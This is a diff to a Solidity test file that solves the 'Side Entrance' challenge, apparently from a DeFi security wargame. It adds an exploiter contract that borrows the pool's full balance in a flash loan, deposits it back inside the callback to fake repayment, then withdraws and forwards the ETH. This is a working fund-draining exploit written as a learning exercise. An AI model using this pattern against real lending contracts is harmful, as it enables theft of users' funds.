@@ -5,6 +5,32 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+contract SideEntranceExploiter {
+    
+    SideEntranceLenderPool public pool;
+    address public recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function startAttack() public {
+        // Request a flash loan for the entire pool balance
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+    
+    // Callback function called by the pool during the flash loan
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+    }
+    // Fallback to receive ETH and forward it to recovery
+    receive() external payable {
+        payable(recovery).transfer(address(this).balance);
+    }
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +71,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);
+        exploiter.startAttack();
     }
 
     /**
